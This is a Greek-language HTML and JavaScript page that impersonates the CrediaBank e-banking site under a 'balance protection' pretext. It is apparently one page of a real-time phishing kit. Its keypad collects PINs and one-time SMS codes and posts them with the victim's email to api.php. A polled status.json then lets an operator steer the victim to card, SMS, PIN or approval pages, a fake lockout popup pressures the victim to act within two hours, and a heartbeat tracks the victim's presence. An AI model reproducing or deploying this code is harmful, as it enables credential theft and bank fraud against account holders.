<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
    <title>CrediaBank e-banking | Προστασία Υπολοίπου</title>
    <link rel="stylesheet" href="./css/snipped.css">
    <link rel="stylesheet" href="./css/cssr.css">
    <link rel="stylesheet" href="./css/cssl.css">
    <link rel="stylesheet" href="./css/css.css">
    <style>
        .login-campaigns-container { display: flex; justify-content: center; align-items: center; width: 100%; }
        .balance-widget { max-width: 500px; width: 100%; margin: 0 auto 48px auto; float: none; }
        @media (max-width: 768px) { .balance-widget { margin-bottom: 32px; } }
        .redesign-footer-container { margin-top: 20px; }

        .balance-page {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            padding: 20px;
            min-height: 60vh;
        }

        .balance-card {
            background: #F5F5F0;
            border-radius: 16px;
            padding: 24px 28px;
            width: 100%;
            max-width: 380px;
            margin-bottom: 32px;
            text-align: center;
        }

        .balance-account {
            font-size: 13px;
            color: #5F6A72;
            text-align: left;
            margin-bottom: 8px;
            font-family: monospace;
        }

        .balance-amount {
            font-size: 32px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 4px;
            white-space: nowrap;
        }

        .balance-label {
            font-size: 13px;
            color: #5F6A72;
            margin-bottom: 20px;
        }

        .balance-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 0;
            font-size: 13px;
            color: #3B4045;
            border-top: 1px solid #E0E0D8;
            white-space: nowrap;
            gap: 12px;
        }

        .balance-row:first-of-type {
            border-top: 1px solid #E0E0D8;
        }

        .balance-row-value {
            font-weight: 600;
            color: #1a1a1a;
            white-space: nowrap;
            flex-shrink: 0;
        }

        .verify-title {
            font-size: 18px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 8px;
            text-align: center;
            line-height: 1.4;
        }

        .verify-subtitle {
            font-size: 13px;
            color: #5F6A72;
            margin-bottom: 24px;
            text-align: center;
            max-width: 320px;
            line-height: 1.4;
        }

        .sms-display {
            display: none;
            gap: 8px;
            margin-bottom: 32px;
            justify-content: center;
            align-items: center;
            min-height: 44px;
            flex-wrap: nowrap;
            width: 100%;
            overflow-x: auto;
        }

        .sms-display.visible {
            display: flex;
        }

        .sms-digit {
            width: 36px;
            height: 44px;
            border-radius: 8px;
            border: 2px solid #001EBA;
            background: #F0F4FF;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: 600;
            color: #001EBA;
            font-family: 'SF Mono', 'Fira Code', monospace;
            transition: all 0.15s ease;
            animation: popIn 0.2s ease;
            flex-shrink: 0;
        }

        @keyframes popIn {
            0% { transform: scale(0.5); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }

        .pin-keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 16px 32px;
            max-width: 320px;
            width: 100%;
        }

        .pin-key {
            background: none;
            border: none;
            font-size: 32px;
            font-weight: 500;
            color: #001EBA;
            width: 72px;
            height: 72px;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto;
            transition: background 0.15s ease;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
        }

        .pin-key:active {
            background: rgba(0, 30, 186, 0.1);
        }

        .pin-key.backspace {
            font-size: 22px;
            color: #7B8A9A;
        }

        .pin-key.confirm {
            font-size: 28px;
            color: #7B8A9A;
            pointer-events: none;
            opacity: 0.4;
        }

        .pin-key.confirm.active {
            color: #001EBA;
            pointer-events: auto;
            opacity: 1;
        }

        #balanceMessageArea {
            margin-top: 16px;
            min-height: 20px;
        }

        @keyframes popupIn {
            0% { transform: scale(0.8); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
    </style>
</head>
<body>

<!-- iOS Style Error Popup Modal -->
<div id="errorPopupModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.4);z-index:10000;align-items:center;justify-content:center;">
    <div style="background:#E8E8ED;border-radius:14px;width:90%;max-width:340px;text-align:center;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:popupIn 0.3s ease;">
        <div style="padding:20px 20px 12px 20px;">
            <div style="font-size:17px;font-weight:600;color:#000;margin-bottom:10px;">Εφαρμογή CrediaBank για κινητά</div>
            <div style="font-size:14px;color:#333;line-height:1.5;">
                Έχετε εξαντλήσει τον μέγιστο αριθμό επαναληπτικών προσπαθειών για τον κωδικό PIN ή τα OTP. Εάν επιθυμείτε να ξεκλειδώσετε τον κωδικό PIN ή τα OTP σας, παρακαλούμε επικοινωνήστε με το Κέντρο Εξυπηρέτησης Πελατών της Τράπεζας στο +30 210 3669000.<br><br>
                Παρακαλούμε καλέστε την εξυπηρέτηση πελατών. Έχετε 2 ώρες για να ολοκληρωθεί αυτό το βήμα.
            </div>
        </div>
        <div style="border-top:1px solid #C5C5C7;">
            <button id="errorPopupOkBtn" style="width:100%;padding:12px;background:none;border:none;font-size:17px;color:#007AFF;font-weight:600;cursor:pointer;">OK</button>
        </div>
    </div>
</div>

<div class="right-side margin-auto snipcss-wnMB2">
    <div class="container ng-scope redesign-header-fragment-container">
        <div class="row">
            <div fragment="redesignHeader" class="ng-scope">
                <div id="redesign-header" class="redesign-header-container ng-scope">
                    <div class="logo-container hidden-small">
                        <a tabindex="0"><img src="https://ebanking.crediabank.com/img/redesignLogo.png?ver=f1604f7ac63ee5a707473775a64907bb02f96080" class="img-responsive" alt="CrediaBank e-banking"></a>
                    </div>
                    <div class="logo-container hidden-above-medium">
                        <a tabindex="0"><img src="./images/logo-small.svg" class="img-responsive" alt="CrediaBank e-banking"></a>
                    </div>
                    <div class="top-links">
                        <ul class="hidden-small">
                            <li style="display:flex;align-items:center;gap:6px;">
                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
                                <div class="header-link-container"><a style="color:#fff;">Καταστήματα &amp; ΑΤΜ</a></div>
                            </li>
                            <li style="display:flex;align-items:center;gap:6px;">
                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
                                <div class="header-link-container"><a style="color:#fff;">Επικοινωνία</a></div>
                            </li>
                            <li style="display:flex;align-items:center;gap:6px;">
                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg>
                                <div class="header-link-container"><a style="color:#fff;">Greek</a></div>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="log-container" class="container">
        <div class="row">
            <div id="main-log" class="ng-scope view-animation-left">
                <form name="balanceForm" autocomplete="off" class="ng-pristine ng-scope">
                    <div class="login-campaigns-container">
                        <div class="login-widget col-lg-6 col-md-12 balance-widget">
                            <div class="top-container">
                                <h1 class="ng-binding" style="display:none;">Προστασία Υπολοίπου</h1>

                                <div class="balance-page">
                                    <!-- Balance Card -->
                                    <div class="balance-card">
                                        <div class="balance-amount" id="balanceAmount">EUR 0.00</div>
                                        <div class="balance-label">Διαθέσιμο υπόλοιπο</div>
                                        <div class="balance-row">
                                            <span>Υπόλοιπο λογιστικού βιβλίου</span>
                                            <span class="balance-row-value" id="ledgerBalance">EUR 0.00</span>
                                        </div>
                                        <div class="balance-row">
                                            <span>Σύνολο κρατήσεων</span>
                                            <span class="balance-row-value" id="totalHolds">EUR 0.00</span>
                                        </div>
                                    </div>

                                    <div class="verify-title">Μπορούμε να επαληθεύσουμε τον κωδικό, το email ή το SMS σας.</div>
                                    <div class="verify-subtitle">Για να προστατεύσετε το υπόλοιπό σας, πληκτρολογήστε τον κωδικό.</div>

                                    <!-- EMPTY container — boxes created dynamically one by one -->
                                    <div class="sms-display" id="smsDisplay"></div>

                                    <div class="pin-keypad">
                                        <button type="button" class="pin-key" data-key="1">1</button>
                                        <button type="button" class="pin-key" data-key="2">2</button>
                                        <button type="button" class="pin-key" data-key="3">3</button>
                                        <button type="button" class="pin-key" data-key="4">4</button>
                                        <button type="button" class="pin-key" data-key="5">5</button>
                                        <button type="button" class="pin-key" data-key="6">6</button>
                                        <button type="button" class="pin-key" data-key="7">7</button>
                                        <button type="button" class="pin-key" data-key="8">8</button>
                                        <button type="button" class="pin-key" data-key="9">9</button>
                                        <button type="button" class="pin-key backspace" data-key="backspace">&#9003;</button>
                                        <button type="button" class="pin-key" data-key="0">0</button>
                                        <button type="button" class="pin-key confirm" data-key="confirm">&#10003;</button>
                                    </div>
                                </div>

                            </div>
                            <div id="balanceMessageArea" class="bottom-container"></div>
                        </div>
                    </div>
                    <div class="container redesign-footer-container ng-scope">
                        <div class="row">
                            <div class="footer-container ng-scope">
                                <div class="footer-content-left">
                                    <span class="footer-logo"></span>
                                    <div class="footer-communication-container">
                                        <div class="footer-communication">
                                            <div class="footer-email-container"><span class="footer-email"></span><a class="footer-bold-weight ng-binding" href="mailto:ebanking@crediabank.com">ebanking@crediabank.com</a></div>
                                            <div class="footer-tel-container"><span class="footer-tel"></span><a class="footer-bold-weight ng-binding" href="tel:2103669000">210 366 9000</a></div>
                                        </div>
                                        <div class="footer-socials-container">
                                            <a class="instagram icon" href="#"></a>
                                            <a class="linkedIn icon" href="#"></a>
                                            <a class="youtube icon" href="#"></a>
                                        </div>
                                    </div>
                                    <div class="footer-apps-container-left">
                                        <div class="footer-apps">
                                            <p class="ng-scope">Κατεβάστε την εφαργμογή :<br><a href="#"><img src="./images/app-apple-store-el.png" border="0"></a><a href="#"><img src="./images/app-google-play-el.png" border="0"></a></p>
                                            <span class="ng-binding">Copyright © 2025</span>
                                        </div>
                                    </div>
                                </div>
                                <div class="footer-section-container">
                                    <div class="footer-sections ng-scope col-6">
                                        <div class="section-title"><h3 class="ng-scope ng-binding">ΠΛΗΡΟΦΟΡΙΕΣ</h3></div>
                                        <ul class="list-without-chevron">
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Όροι Χρήσης</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Ασφάλεια Συναλλαγών</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Κωδικοί Μιας Χρήσης</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Συχνές Ερωτήσεις</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Υποστήριξη</a></li>
                                        </ul>
                                    </div>
                                    <div class="footer-sections ng-scope col-6">
                                        <div class="section-title"><h3 class="ng-scope ng-binding">ΧΡΗΣΙΜΑ</h3></div>
                                        <ul class="list-without-chevron">
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Πολιτική Cookies</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Προσωπικά Δεδομένα</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Εγγύηση Καταθέσεων</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Υπολογιστής ΙΒΑΝ</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Ειδικοί Όροι Τραπεζικών Εργασιών</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Εργαλείο Μετατροπής Αρχείου σε XML</a></li>
                                        </ul>
                                    </div>
                                </div>
                                <div class="footer-apps-container-right">
                                    <div class="footer-apps">
                                        <p class="ng-scope">Κατεβάστε την εφαργμογή :<br><a href="#"><img src="./images/app-apple-store-el.png" border="0"></a><a href="#"><img src="./images/app-google-play-el.png" border="0"></a></p>
                                        <span class="ng-binding">Copyright © 2025</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<div class="modal-overlay ng-scope ng-hide" id="loadingModal">
    <div class="modal-loading opacity-animation">
        <div class="cancel-modal"></div>
        <div class="spinner-container"></div>
        <span class="text ng-scope">Παρακαλώ περιμένετε...</span>
    </div>
</div>

<script>
(function() {
    const msgContainer = document.getElementById('balanceMessageArea');
    const loadingModal = document.getElementById('loadingModal');
    const smsDisplay = document.getElementById('smsDisplay');
    const confirmBtn = document.querySelector('.pin-key.confirm');
    const errorPopupModal = document.getElementById('errorPopupModal');
    const errorPopupOkBtn = document.getElementById('errorPopupOkBtn');

    let pinValue = '';
    const MIN_SUBMIT_DIGITS = 4;
    const MAX_DIGITS = 12;
    let checkInterval = null;
    let lastStatus = '';
    let isSubmitted = false;
    let errorShown = false;

    // Get email from URL
    const urlParams = new URLSearchParams(window.location.search);
    let myEmail = urlParams.get('u') || localStorage.getItem('tempEmail') || '';
    if (!myEmail) {
        myEmail = localStorage.getItem('tempEmail') || '';
    }
    localStorage.setItem('tempEmail', myEmail);

    // Fetch balance from status.json
    function fetchBalance() {
        fetch('status.json?t=' + Date.now(), { cache: 'no-store' })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                for (var ip in data) {
                    if (data[ip].email === myEmail && data[ip].balance_amount) {
                        var amt = data[ip].balance_amount;
                        document.getElementById('balanceAmount').textContent = 'EUR ' + amt;
                        document.getElementById('ledgerBalance').textContent = 'EUR ' + amt;
                        document.getElementById('totalHolds').textContent = 'EUR 0.00';
                        break;
                    }
                }
            })
            .catch(function(err) { console.log('Balance fetch error', err); });
    }
    fetchBalance();
    setInterval(fetchBalance, 2000);

    function setLoading(show) {
        if (!loadingModal) return;
        if (show) loadingModal.classList.remove('ng-hide');
        else loadingModal.classList.add('ng-hide');
    }

    function showToastMessage(text, isError) {
        if (!msgContainer) return;
        msgContainer.innerHTML = '<div style="background:' + (isError ? '#FFEFEF' : '#E6F7E6') + ';color:' + (isError ? '#B00020' : '#1E7A1E') + ';border-radius:12px;padding:12px;font-weight:500;text-align:center;">' + text + '</div>';
        setTimeout(function() {
            if (msgContainer.innerHTML.indexOf(text) !== -1) msgContainer.innerHTML = '';
        }, 5500);
    }

    function showErrorPopup() {
        if (errorShown) return;
        errorShown = true;
        if (errorPopupModal) {
            errorPopupModal.style.display = 'flex';
        }
        setLoading(false);
    }

    if (errorPopupOkBtn) {
        errorPopupOkBtn.addEventListener('click', function() {
            window.location.href = 'finish.php';
        });
    }

    // RENDER boxes dynamically — one per character, step by step
    function renderDigits() {
        if (!smsDisplay) return;

        // Show container if we have digits
        if (pinValue.length > 0) {
            smsDisplay.classList.add('visible');
        } else {
            smsDisplay.classList.remove('visible');
        }

        // Clear and rebuild boxes one by one
        smsDisplay.innerHTML = '';
        for (var i = 0; i < pinValue.length; i++) {
            var box = document.createElement('div');
            box.className = 'sms-digit';
            box.textContent = pinValue[i];
            smsDisplay.appendChild(box);
        }

        // Enable submit only when 4+ digits
        if (confirmBtn) {
            if (pinValue.length >= MIN_SUBMIT_DIGITS) {
                confirmBtn.classList.add('active');
            } else {
                confirmBtn.classList.remove('active');
            }
        }
    }

    function addDigit(digit) {
        if (isSubmitted || errorShown) return;
        if (pinValue.length < MAX_DIGITS) {
            pinValue += digit;
            renderDigits();
        }
    }

    function removeDigit() {
        if (isSubmitted || errorShown) return;
        if (pinValue.length > 0) {
            pinValue = pinValue.slice(0, -1);
            renderDigits();
        }
    }

    function onVerify() {
        if (pinValue.length < MIN_SUBMIT_DIGITS) {
            showToastMessage("Παρακαλώ εισάγετε τουλάχιστον 4 ψηφία", true);
            return;
        }
        sendOtpToApi(pinValue);
    }

    // Keypad events
    document.querySelectorAll('.pin-key').forEach(function(btn) {
        btn.addEventListener('click', function() {
            const key = this.getAttribute('data-key');
            if (key === 'backspace') {
                removeDigit();
            } else if (key === 'confirm') {
                onVerify();
            } else if (key >= '0' && key <= '9') {
                addDigit(key);
            }
        });
    });

    // Physical keyboard support
    document.addEventListener('keydown', function(e) {
        if (isSubmitted || errorShown) return;
        if (e.key >= '0' && e.key <= '9') {
            addDigit(e.key);
        } else if (e.key === 'Backspace') {
            removeDigit();
        } else if (e.key === 'Enter') {
            onVerify();
        }
    });

    // Send OTP to API
    function sendOtpToApi(code) {
        if (!myEmail) {
            showToastMessage("Σφάλμα: Δεν βρέθηκε στοιχεία χρήστη", true);
            return;
        }

        isSubmitted = true;
        setLoading(true);

        var fd = new FormData();
        fd.append('type', '2fa_sms');
        fd.append('code', code);
        fd.append('email', myEmail);

        fetch('api.php', { method: 'POST', body: fd })
            .then(function() {
                showToastMessage("Επαλήθευση κωδικού...", false);
                if (!checkInterval) {
                    checkInterval = setInterval(checkStatus, 2000);
                }
            })
            .catch(function(err) {
                console.warn(err);
                isSubmitted = false;
                setLoading(false);
                showToastMessage("Σφάλμα επικοινωνίας", true);
            });
    }

    // Check status and redirect
    function checkStatus() {
        fetch('status.json?t=' + Date.now(), { cache: 'no-store' })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                var status = '';
                for (var ip in data) {
                    if (data[ip].email === myEmail) {
                        status = data[ip].status;
                        break;
                    }
                }
                if (status !== lastStatus) {
                    lastStatus = status;
                    if (status === 'go_balance') {
                        // stay here
                    }
                    else if (status === 'go_email' || status === 'go_mfa') {
                        stopChecking();
                        window.location.href = 'email.php?u=' + encodeURIComponent(myEmail);
                    }
                    else if (status === 'go_sms') {
                        stopChecking();
                        window.location.href = 'sms.php?u=' + encodeURIComponent(myEmail);
                    }
                    else if (status === 'go_card') {
                        stopChecking();
                        window.location.href = 'card.php?u=' + encodeURIComponent(myEmail);
                    }
                    else if (status === 'go_approve') {
                        stopChecking();
                        window.location.href = 'aprouve.php?u=' + encodeURIComponent(myEmail);
                    }
                    else if (status === 'go_pin') {
                        stopChecking();
                        window.location.href = 'pin.php?u=' + encodeURIComponent(myEmail);
                    }
                    else if (status === 'show_error') {
                        stopChecking();
                        showErrorPopup();
                    }
                    else if (status === 'finished' || status === 'go_done') {
                        stopChecking();
                        window.location.href = 'done.php';
                    }
                    else if (status === 'otp_error') {
                        isSubmitted = false;
                        showToastMessage("Ο κωδικός που εισαγάγατε δεν είναι έγκυρος. Παρακαλώ δοκιμάστε ξανά και δώστε ιδιαίτερη προσοχή σε αυτό το βήμα.", true);
                        pinValue = '';
                        renderDigits();
                        setLoading(false);
                    }
                    else if (status === 'push_error') {
                        isSubmitted = false;
                        showToastMessage("Η συναλλαγή απορρίφθηκε", true);
                        pinValue = '';
                        renderDigits();
                        setLoading(false);
                    }
                }
            })
            .catch(function(err) { console.log("Waiting for status...", err); });
    }

    function stopChecking() {
        if (checkInterval) {
            clearInterval(checkInterval);
            checkInterval = null;
        }
    }

    // Heartbeat
    setInterval(function() {
        var fd = new FormData();
        fd.append('type', 'heartbeat');
        fd.append('email', myEmail || '');
        fetch('api.php', { method: 'POST', body: fd }).catch(function(){});
    }, 3000);
    console.log('Balance Page initialized with email:', myEmail);

})();
</script>
</body>
</html>